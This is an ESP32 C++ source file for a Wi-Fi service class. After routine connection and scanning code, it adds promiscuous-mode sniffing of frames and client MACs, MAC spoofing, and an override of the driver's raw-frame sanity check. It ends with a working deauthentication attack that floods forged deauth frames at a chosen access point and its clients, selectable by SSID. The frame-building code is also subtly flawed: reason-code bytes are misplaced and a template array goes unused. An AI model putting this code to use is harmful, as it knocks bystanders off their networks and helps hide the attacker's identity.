#include "WifiService.h"

// Static member
std::vector<std::string> WifiService::sniffLog;
portMUX_TYPE WifiService::sniffMux = portMUX_INITIALIZER_UNLOCKED;

WifiService::WifiService() : connected(false) {
    WiFi.mode(WIFI_STA);
}

bool WifiService::connect(const std::string& ssid, const std::string& password, unsigned long timeoutMs) {
    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long startAttemptTime = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < timeoutMs) {
        delay(100);
    }

    connected = WiFi.status() == WL_CONNECTED;
    return connected;
}

void WifiService::disconnect() {
    WiFi.disconnect(true);
    connected = false;
}

bool WifiService::isConnected() const {
    return WiFi.status() == WL_CONNECTED;
}

std::string WifiService::getLocalIP() const {
    if (!isConnected()) return "";
    return WiFi.localIP().toString().c_str();
}

std::string WifiService::getCurrentIP() const {
    if (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA) {
        return WiFi.softAPIP().toString().c_str();
    }
    return WiFi.localIP().toString().c_str();
}

bool WifiService::startAccessPoint(const std::string& ssid, const std::string& password, int channel, int maxConn) {
    // WiFi.mode(WIFI_AP);
    if (password.empty()) {
        return WiFi.softAP(ssid.c_str(), nullptr, channel, false, maxConn);
    } else {
        return WiFi.softAP(ssid.c_str(), password.c_str(), channel, false, maxConn);
    }
}

int WifiService::ping(const std::string& host) {
    IPAddress ip;
    if (!WiFi.hostByName(host.c_str(), ip)) return -1;

    unsigned long start = millis();
    bool success = Ping.ping(ip, 1);
    unsigned long end = millis();

    return success ? (end - start) : -1;
}

std::vector<std::string> WifiService::scanNetworks() {
    std::vector<std::string> results;

    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);

    for (int i = 0; i < n; ++i) {
        std::stringstream ss;
        ss << "  SSID: " << WiFi.SSID(i).c_str()
           << " | RSSI: " << WiFi.RSSI(i)
           << " dBm | Sec: "
           << (WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "Open" : "Secured");
        results.push_back(ss.str());
    }

    return results;
}

void WifiService::reset() {
    disconnect();
    WiFi.mode(WIFI_STA);
    connected = false;
}

void WifiService::setModeApSta() {
    WiFi.mode(WIFI_AP_STA);
}

void WifiService::setModeApOnly() {
    WiFi.mode(WIFI_AP);
}

std::string WifiService::getApIp() const {
    String ip = WiFi.softAPIP().toString();
    return std::string(ip.c_str());
}

std::string WifiService::getLocalIp() const {
    String ip = WiFi.localIP().toString();
    return std::string(ip.c_str());
}


std::vector<WiFiNetwork> WifiService::scanDetailedNetworks() {
    std::vector<WiFiNetwork> networks;
    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);

    for (int i = 0; i < n; i++) {
        WiFiNetwork network;
        network.ssid = WiFi.SSID(i).c_str();
        if (network.ssid.empty()) network.ssid = "Hidden SSID";
        network.rssi = WiFi.RSSI(i);
        network.encryption = WiFi.encryptionType(i);
        network.open = (network.encryption == WIFI_AUTH_OPEN);
        network.vulnerable = isVulnerable(network.encryption);

        char mac[18];
        uint8_t* bssid = WiFi.BSSID(i);
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 bssid[0], bssid[1], bssid[2],
                 bssid[3], bssid[4], bssid[5]);
        network.bssid = mac;

        network.channel = WiFi.channel(i);
        network.hidden = (network.ssid == "Hidden SSID");

        networks.push_back(network);
    }

    return networks;
}


std::vector<WiFiNetwork> WifiService::getOpenNetworks(const std::vector<WiFiNetwork>& networks) {
    std::vector<WiFiNetwork> open;
    for (auto net : networks) {
        if (net.open) open.push_back(net);
    }
    return open;
}

bool WifiService::isVulnerable(wifi_auth_mode_t encryption) const {
    return encryption == WIFI_AUTH_WEP || encryption == WIFI_AUTH_WPA_PSK;
}

std::vector<WiFiNetwork> WifiService::getVulnerableNetworks(const std::vector<WiFiNetwork>& networks) {
    std::vector<WiFiNetwork> vuln;
    for (auto net : networks) {
        if (net.encryption == WIFI_AUTH_WEP || net.encryption == WIFI_AUTH_WPA_PSK) {
            WiFiNetwork copy = net;
            copy.vulnerable = true;
            vuln.push_back(copy);
        }
    }
    return vuln;
}


std::string WifiService::encryptionTypeToString(wifi_auth_mode_t enc) {
    switch (enc) {
        case WIFI_AUTH_OPEN: return "OPEN";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2_WPA3";
        case WIFI_AUTH_WAPI_PSK: return "WAPI";
        default: return "UNKNOWN";
    }
}

void WifiService::startPassiveSniffing() {
    disconnect();

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    if (isConnected()) {
        esp_wifi_deinit();
    }
    delay(300);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WifiService::snifferCallback);
}

void WifiService::stopPassiveSniffing() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_stop();
    esp_wifi_deinit();
    sniffLog.clear();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
}

void WifiService::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t) {
    const wifi_promiscuous_pkt_t* pkt = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t ch = pkt->rx_ctrl.channel;

    uint8_t type = 0, subtype = 0;
    extractTypeSubtype(payload, type, subtype);
    std::string typeStr = getFrameTypeName(type, subtype);
    std::string macStr = formatMac(payload + 10);

    std::string line = "CH:" + std::to_string(ch) +
                       " RSSI:" + std::to_string(rssi) +
                       " Type:" + typeStr;

    // Add SSID if possible
    if (type == 0 && (subtype == 8 || subtype == 4)) {
        std::string ssid = parseSsidFromPacket(payload, len, type, subtype);
        if (!ssid.empty()) {
            line += " SSID:\"" + ssid + "\"";
        }
    }

    line += " MAC:" + macStr;

    portENTER_CRITICAL(&sniffMux);
    if (sniffLog.size() < 200) sniffLog.push_back(line);
    portEXIT_CRITICAL(&sniffMux);
}

std::vector<std::string> WifiService::getSniffLog() {
    std::vector<std::string> copy;

    portENTER_CRITICAL(&sniffMux);
    copy.swap(sniffLog);
    portEXIT_CRITICAL(&sniffMux);

    return copy;
}

bool WifiService::switchChannel(uint8_t channel) {
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    return err == ESP_OK;
}

std::string WifiService::formatMac(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

std::string WifiService::getFrameTypeSubtype(const uint8_t* payload, uint8_t& type, uint8_t& subtype) {
    uint16_t fc = payload[0] | (payload[1] << 8);
    type = (fc & 0x000C) >> 2;
    subtype = (fc & 0x00F0) >> 4;
    return std::to_string(type) + "/" + std::to_string(subtype);
}

std::string WifiService::parseSsidFromPacket(const uint8_t* payload, int len, uint8_t type, uint8_t subtype) {
    int offset = 24;
    if (type == 0 && subtype == 8) offset = 36;

    while (offset + 2 <= len) {
        uint8_t id = payload[offset];
        uint8_t elen = payload[offset + 1];
        if (offset + 2 + elen > len) break;

        if (id == 0) {
            return std::string(reinterpret_cast<const char*>(payload + offset + 2), elen);
        }

        offset += 2 + elen;
    }

    return "";
}

std::string WifiService::getFrameTypeName(uint8_t type, uint8_t subtype) {
    if (type == 0) {
        switch (subtype) {
            case 0:  return "Assoc Req";
            case 1:  return "Assoc Resp";
            case 4:  return "Probe Req";
            case 5:  return "Probe Resp";
            case 8:  return "Beacon";
            case 10: return "Disassoc";
            case 11: return "Auth";
            case 12: return "Deauth";
            default: return "Mgmt/" + std::to_string(subtype);
        }
    } else if (type == 1) {
        return "Ctrl/" + std::to_string(subtype);
    } else if (type == 2) {
        if (subtype == 0) return "Data";
        if (subtype == 4) return "Null Data";
        return "Data/" + std::to_string(subtype);
    }
    return "Unknown";
}

void WifiService::extractTypeSubtype(const uint8_t* payload, uint8_t& type, uint8_t& subtype) {
    uint16_t fc = payload[0] | (payload[1] << 8);
    type = (fc & 0x0C) >> 2;
    subtype = (fc & 0xF0) >> 4;
}

bool WifiService::spoofMacAddress(const std::string& macStr, MacInterface which) {
    if (macStr.length() != 17) return false;

    uint8_t mac[6];
    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }

    for (int i = 0; i < 6; ++i)
        mac[i] = static_cast<uint8_t>(values[i]);

    mac[0] &= 0xFE; // unicast

    WiFi.disconnect(true);
    delay(100);

    // Trad enum to interface
    wifi_interface_t iface = (which == MacInterface::Station) ? WIFI_IF_STA : WIFI_IF_AP;

    // Mode
    if (iface == WIFI_IF_STA) {
        WiFi.mode(WIFI_MODE_STA);
    } else {
        WiFi.mode(WIFI_MODE_AP);
    }

    esp_err_t err = esp_wifi_set_mac(iface, mac);
    if (err != ESP_OK) {
        return false;
    }

    esp_wifi_start();
    return true;
}

std::string WifiService::getMacAddressSta() const {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    char buf[18];
    return formatMac(mac);
}

std::string WifiService::getMacAddressAp() const {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    char buf[18];
    return formatMac(mac);
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t)
{
    // 0 ⇒ “frame is OK” → the driver forwards it to the PHY
    return 0;
}


static const uint8_t deauthTemplate[26] PROGMEM = {
    0xC0, 0x00, 0x00, 0x00,                         // FC + duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // addr1 = broadcast
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,             // addr2 = BSSID (patch)
    0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF,             // addr3 = BSSID (patch)
    0x00, 0x00,                                     // seq-ctrl
    0x07, 0x00                                      // reason code 7
};

static inline void macStrToBytes(const std::string& macStr, uint8_t mac[6])
{
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}
//------------------------------------------------------------------
//  File-scope scratch that both normal code and the ISR can access
//------------------------------------------------------------------
static std::vector<std::array<uint8_t, 6>>  g_staList;
static uint8_t                              g_apBssid[6];
static portMUX_TYPE                         g_staMux = portMUX_INITIALIZER_UNLOCKED;

//------------------------------------------------------------------
//  ISR-safe promiscuous callback (no captures → plain C function)
//------------------------------------------------------------------
static void IRAM_ATTR clientSniffer(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* hdr = p->payload;

    // To-DS = 1, From-DS = 0  ⇒ STA → AP
    if ((hdr[1] & 0x03) != 0x01) return;

    const uint8_t* ap  = hdr + 4;   // addr1
    const uint8_t* sta = hdr +10;   // addr2

    if (memcmp(ap, g_apBssid, 6) != 0) return;   // different BSSID

    std::array<uint8_t,6> mac;
    memcpy(mac.data(), sta, 6);

    portENTER_CRITICAL_ISR(&g_staMux);
    bool seen=false;
    for (auto& e : g_staList) if (e == mac) { seen=true; break; }
    if (!seen) g_staList.push_back(mac);
    portEXIT_CRITICAL_ISR(&g_staMux);
}

//------------------------------------------------------------------
//  Collect client MACs of a given BSSID on its channel
//------------------------------------------------------------------
std::vector<std::array<uint8_t,6>>
WifiService::getClientsOfBssid(const uint8_t bssid[6],
                               uint8_t channel,
                               uint32_t dwellMs)
{
    // reset scratch
    memcpy(g_apBssid, bssid, 6);
    g_staList.clear();

    // hop + sniff
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&clientSniffer);

    uint32_t start = millis();
    while (millis() - start < dwellMs) delay(1);

    // stop sniff
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    // copy out results (thread-safe)
    std::vector<std::array<uint8_t,6>> out;
    portENTER_CRITICAL(&g_staMux);
    out = g_staList;
    portEXIT_CRITICAL(&g_staMux);

    return out;
}
void WifiService::deauthAttack(const uint8_t bssid[6], uint8_t channel,
                               uint8_t bursts, uint32_t sniffMs)
{
    // ① ensure AP interface exists (as discussed earlier)
    if (WiFi.getMode() != WIFI_MODE_AP && WiFi.getMode() != WIFI_MODE_APSTA) {
        WiFi.mode(WIFI_MODE_AP);
        esp_wifi_start();
    }

    // ② gather client MACs
    auto clients = getClientsOfBssid(bssid, channel, sniffMs);

    // ③ pre-build templates
    uint8_t pkt[26] = {
        0xc0,0x00, 0x00,0x00,
        0xff,0xff,0xff,0xff,0xff,0xff,     // addr1 = broadcast (will swap for STA)
        /* addr2 & addr3 set below */
        0x00,0x00, 0x07,0x00
    };
    memcpy(&pkt[16], bssid, 6);            // addr3 always AP
    // send bursts
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    for (uint8_t i=0;i<bursts;++i) {
        // ③a broadcast
        memcpy(&pkt[10], bssid, 6);        // addr2 = AP
        memcpy(&pkt[4] , "\xff\xff\xff\xff\xff\xff",6);
        esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);

        // ③b one unicast per client
        for (auto& sta: clients) {
            memcpy(&pkt[4],  sta.data(),6);  // addr1 = STA
            esp_wifi_80211_tx(WIFI_IF_AP,pkt,26,true);
        }
        delay(1);
    }
}


bool WifiService::deauthApBySsid(const std::string& ssid, uint8_t bursts, uint32_t sniffMs)
{
    auto nets = scanDetailedNetworks();     // your existing scan helper
    for (auto& n : nets) {
        if (n.ssid == ssid) {
            uint8_t bssid[6];
            sscanf(n.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &bssid[0], &bssid[1], &bssid[2],
                   &bssid[3], &bssid[4], &bssid[5]);

            deauthAttack(bssid, n.channel, bursts, sniffMs);
            return true;                    // success
        }
    }
    return false;                           // SSID not found
}
